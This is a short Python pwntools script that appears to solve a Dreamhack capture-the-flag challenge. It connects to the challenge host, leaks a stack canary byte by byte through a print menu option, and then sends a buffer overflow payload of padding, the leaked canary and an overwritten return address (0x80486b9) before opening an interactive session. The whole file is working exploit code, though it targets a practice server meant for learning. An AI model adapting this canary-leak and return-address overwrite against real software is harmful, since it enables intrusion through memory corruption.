from pwn import *
from pwn import p32
from pwn import p8

p=remote("host3.dreamhack.games",10979)

canary=b"\x00"

for i in range(129,132): 
	p.recvuntil("> ")
	p.sendline("P")
	p.sendline(str(i))
	canary+=p8(int(p.recvline().split()[-1],16)) 

payload=b'\x90'*0x40+canary+b'\x90'*0x04+b'\x90'*0x04+p32(0x80486b9)

p.recvuntil("> ")
p.sendline("E")
p.sendlineafter("Name Size : ",str(144))
p.sendlineafter("Name : ",payload)

p.interactive()